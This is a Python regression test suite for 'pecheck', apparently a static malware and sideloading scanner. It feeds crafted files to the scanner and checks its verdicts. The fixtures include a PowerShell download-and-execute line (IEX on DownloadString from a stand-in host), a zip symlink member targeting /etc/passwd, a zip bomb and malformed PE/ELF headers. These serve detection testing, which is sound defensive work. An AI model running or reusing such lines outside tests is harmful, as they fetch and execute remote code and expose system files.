"""Regression tests for issues found in the post-implementation review."""
import os
import struct
import sys
import unittest
import zipfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.base import CorpusTest  # noqa: E402
from tests.gen import craft_pe  # noqa: E402
from pecheck.scan import scan_targets, scan_file  # noqa: E402


class TestUtf16Scripts(CorpusTest):
    def test_utf16le_ps1_dropper_review(self):
        line = "$d = New-Object Net.WebClient; IEX $d.DownloadString('http://x/x.ps1')"
        with open(self.path("u16.ps1"), "wb") as f:
            f.write(b"\xff\xfe" + line.encode("utf-16le"))
        r = scan_file(self.path("u16.ps1"))
        self.assertEqual(r.verdict, "REVIEW")
        self.assertTrue(any("download+execute" in f.detail for f in r.findings))


class TestModProxyDowngrade(CorpusTest):
    def test_reshade_dxgi_not_review(self):
        gd = os.path.join(self.dir, "modgame")
        os.makedirs(gd, exist_ok=True)
        craft_pe(os.path.join(gd, "game.exe"), imports=("CreateFileA",))
        p = craft_pe(os.path.join(gd, "dxgi.dll"), imports=("CreateFileA",), dll_chars=0x2102)
        with open(p, "ab") as f:
            f.write(b"ReShade crosire" + b"\x00" * 16)
        with open(os.path.join(gd, "ReShade.ini"), "w") as f:
            f.write("[GENERAL]")
        res = scan_targets([gd], use_sigs=False)
        dx = next(r for r in res.reports if r.basename == "dxgi.dll")
        sl = [f for f in dx.findings if f.category == "SIDELOAD?"]
        self.assertTrue(all(f.severity == "note" for f in sl), [f.detail for f in sl])
        self.assertNotEqual(dx.verdict, "REVIEW")

    def test_plain_dxgi_without_mod_context_still_review(self):
        gd = os.path.join(self.dir, "plainproxy")
        os.makedirs(gd, exist_ok=True)
        craft_pe(os.path.join(gd, "app2.exe"), imports=("CreateFileA",))
        craft_pe(os.path.join(gd, "dxgi.dll"), imports=("CreateFileA",), dll_chars=0x2102)
        res = scan_targets([gd], use_sigs=False)
        dx = next(r for r in res.reports if r.basename == "dxgi.dll")
        self.assertEqual(dx.verdict, "REVIEW")


class TestBigZip(CorpusTest):
    def test_zip_beyond_raw_cap_members_listed(self):
        import io
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as z:
            z.writestr("big.bin", b"\x00" * (65 << 20))
            z.writestr("marker.exe", b"MZ" + b"\x00" * 100)
        with open(self.path("big.zip"), "wb") as f:
            f.write(buf.getvalue())
        r = scan_file(self.path("big.zip"))
        self.assertFalse(any("zip unreadable" in f.detail for f in r.findings),
                         [f.detail for f in r.findings])
        self.assertTrue(any("marker.exe" in f.detail for f in r.findings))


class TestZipMemberFlags(CorpusTest):
    def test_bomb_ratio_noted(self):
        p = self.path("bomb.zip")
        with zipfile.ZipFile(p, "w", compression=zipfile.ZIP_DEFLATED) as z:
            z.writestr("bomb.bin", b"\x00" * (50 << 20))
        r = scan_file(p)
        self.assertTrue(any("compression ratio" in f.detail for f in r.findings),
                        [f.detail for f in r.findings])

    def test_symlink_member_noted(self):
        p = self.path("sym.zip")
        zi = zipfile.ZipInfo("link.bin")
        zi.create_system = 3
        zi.external_attr = (0o120777 << 16)
        with zipfile.ZipFile(p, "w") as z:
            z.writestr(zi, "/etc/passwd")
        r = scan_file(p)
        self.assertTrue(any("symlink member" in f.detail for f in r.findings))


class TestMediaNoise(CorpusTest):
    def test_jpg_no_entropy_note(self):
        with open(self.path("photo.jpg"), "wb") as f:
            f.write(b"\xff\xd8\xff\xe0" + os.urandom(200_000) + b"\xff\xd9")
        r = scan_file(self.path("photo.jpg"))
        self.assertEqual(r.kind, "MEDIA")
        self.assertFalse(any("entropy" in f.detail for f in r.findings))
        self.assertNotEqual(r.verdict, "REVIEW")

    def test_png_kind_media(self):
        with open(self.path("img.png"), "wb") as f:
            f.write(b"\x89PNG\r\n\x1a\n" + os.urandom(1000))
        self.assertEqual(scan_file(self.path("img.png")).kind, "MEDIA")


class TestCollectEdges(CorpusTest):
    def test_nfo_is_side_file_not_target(self):
        res = scan_targets([self.path("CoolGame-CODEX")], use_sigs=False)
        names = {os.path.basename(r.path) for r in res.reports}
        self.assertNotIn("release.nfo", names)
        self.assertTrue(any("release.nfo" in p for p in res.side_files))

    def test_colon_filename_scanned_on_posix(self):
        with open(self.path("we:ird.bin"), "wb") as f:
            f.write(os.urandom(64))
        res = scan_targets([self.path("we:ird.bin")], use_sigs=False)
        self.assertEqual(len(res.reports), 1)

    def test_huge_file_truncated_flag(self):
        from pecheck.peparse import load, RAW_CAP
        p = self.path("huge2.bin")
        with open(p, "wb") as f:
            f.write(b"z" * (RAW_CAP + 4096))
        t = load(p)
        self.assertTrue(t.truncated)
        self.assertEqual(len(t.raw), RAW_CAP)


class TestSeverityCalibration(CorpusTest):
    def test_plain_rtf_object_not_critical(self):
        with open(self.path("plain.rtf"), "wb") as f:
            f.write(b"{\\rtf1{\\object{\\*\\objdata 0105}}}")
        r = scan_file(self.path("plain.rtf"))
        self.assertNotEqual(r.verdict, "REVIEW")

    def test_ole_createobject_only_not_critical(self):
        with open(self.path("stock.doc"), "wb") as f:
            f.write(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 8 +
                    b"AutoOpen" + b"\x00" * 32 + b"CreateObject" + b"\x00" * 32)
        r = scan_file(self.path("stock.doc"))
        self.assertNotEqual(r.verdict, "REVIEW")

    def test_pdf_aa_js_form_not_critical(self):
        with open(self.path("form.pdf"), "wb") as f:
            f.write(b"%PDF-1.6\n1 0 obj<</AA 5 0 R/JS 5 0 R>>endobj\n%%EOF\n")
        r = scan_file(self.path("form.pdf"))
        self.assertNotEqual(r.verdict, "REVIEW")

    def test_js_bundle_b64_not_critical(self):
        with open(self.path("bundle.js"), "wb") as f:
            f.write(b"const icon = \"data:image/png;base64," + b"QUJD" * 1500 + b"\";")
        r = scan_file(self.path("bundle.js"))
        crit = [f for f in r.findings if f.severity == "CRITICAL"]
        self.assertFalse([f for f in crit if "mammoth" in f.detail])


class TestShortDataDirectories(CorpusTest):
    """Malformed NumberOfRvaAndSizes must not kill whole detectors (B1)."""

    def _short_dirs(self, n):
        p = self.path(f"shortdirs{n}.exe")
        craft_pe(p, imports=("URLDownloadToFileA",), dll_chars=0x0002)
        data = bytearray(open(p, "rb").read())
        off = struct.unpack_from("<I", data, 0x3C)[0] + 4 + 20 + 108  # PE32+ NumberOfRvaAndSizes
        struct.pack_into("<H", data, off, n)
        open(p, "wb").write(bytes(data))
        return p

    def test_imports_survive_short_dir_list(self):
        r = scan_file(self._short_dirs(0))
        self.assertFalse(any("detector failed" in f.detail for f in r.findings),
                         [f.detail for f in r.findings])
        # dir list empty -> import table undeclared -> the 0-imports escape fires
        self.assertTrue(any("0 imports" in f.detail and f.severity == "CRITICAL"
                            for f in r.findings))
        self.assertEqual(r.verdict, "REVIEW")

    def test_critical_import_finding_survives_partial_dirs(self):
        # ndirs=6 hides only dirs >= 6: dir 1 (IMPORT) stays, URLDownloadToFileA
        # must keep its CRITICAL verdict (was lost whole-detector before the fix)
        r = scan_file(self._short_dirs(6))
        self.assertTrue(any("URLDownloadToFileA" in f.detail and f.severity == "CRITICAL"
                            for f in r.findings), [f.detail for f in r.findings])
        self.assertEqual(r.verdict, "REVIEW")

    def test_dotnet_structure_survive_partial_dirs(self):
        r = scan_file(self._short_dirs(6))
        failed = [f.detail for f in r.findings if "detector failed" in f.detail]
        self.assertEqual(failed, [], failed)


class TestBigZipNested(CorpusTest):
    def test_nested_member_listed_once_above_128_entries(self):
        p = self.path("wide.zip")
        with zipfile.ZipFile(p, "w") as z:
            for i in range(130):
                z.writestr(f"f{i}.txt", "x")
            z.writestr("inner.zip", "PK\x03\x04....")
        r = scan_file(p)
        nested = [f for f in r.findings if "nested archive" in f.detail]
        self.assertTrue(nested)
        self.assertEqual(nested[0].detail.count("inner.zip"), 1, nested[0].detail)


class TestAvLockRetry(unittest.TestCase):
    """Real-time AV briefly holds fresh files (EINVAL/EACCES on read):
    _read must retry instead of failing the scan with an error verdict."""

    def test_retries_transient_read_error(self):
        import errno
        import hashlib
        from unittest import mock
        from pecheck import peparse
        data = b"hello world"
        calls = {"n": 0}

        class Flaky:
            def __init__(self, *a):
                self.done = False

            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

            def read(self, n):
                calls["n"] += 1
                if calls["n"] <= 2:
                    raise OSError(errno.EINVAL, "Invalid argument")
                if not self.done:          # one chunk of payload, then EOF
                    self.done = True
                    return data
                return b""

        with mock.patch("builtins.open", Flaky), \
                mock.patch("pecheck.peparse.time.sleep") as slept:
            raw, sha, size = peparse._read("whatever")
        self.assertEqual((raw, size), (data, len(data)))
        self.assertEqual(sha, hashlib.sha256(data).hexdigest())
        self.assertEqual(slept.call_count, 2)   # two failures -> two backoffs

    def test_persistent_error_still_raises(self):
        import errno
        from unittest import mock
        from pecheck import peparse

        class Dead:
            def __init__(self, *a):
                pass

            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

            def read(self, n):
                raise OSError(errno.EACCES, "Permission denied")

        with mock.patch("builtins.open", Dead), \
                mock.patch("pecheck.peparse.time.sleep") as slept:
            with self.assertRaises(OSError):
                peparse._read("whatever")
        self.assertEqual(slept.call_count, 3)   # 4 attempts -> 3 backoffs

    def test_enoent_not_retried(self):
        import errno
        from unittest import mock
        from pecheck import peparse

        class Missing:
            def __init__(self, *a):
                raise OSError(errno.ENOENT, "No such file")

        with mock.patch("builtins.open", Missing), \
                mock.patch("pecheck.peparse.time.sleep") as slept:
            with self.assertRaises(OSError):
                peparse._read("whatever")
        self.assertEqual(slept.call_count, 0)   # missing file: fail immediately


class TestElfShstrNoNul(unittest.TestCase):
    def test_last_name_not_truncated_without_trailing_nul(self):
        from pecheck.detectors.elflite import _sections
        shoff, shentsize, nsec = 64, 64, 2
        hdr_end = shoff + shentsize * nsec
        shstr = b"\x00.text"  # malformed: no trailing NUL
        buf = bytearray(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8)
        buf += struct.pack("<HHIQQQIHHHHHH", 2, 0x3E, 1, 0, 0, shoff, 0,
                           64, 0, 0, shentsize, nsec, 1)
        buf += b"\x00" * shentsize
        buf += struct.pack("<IIQQQQIIQQ", 1, 1, 0, 0, hdr_end, len(shstr), 0, 0, 0, 0)
        buf += shstr
        _, _, names = _sections(bytes(buf))
        self.assertEqual(names, ["", ".text"])


if __name__ == "__main__":
    unittest.main()
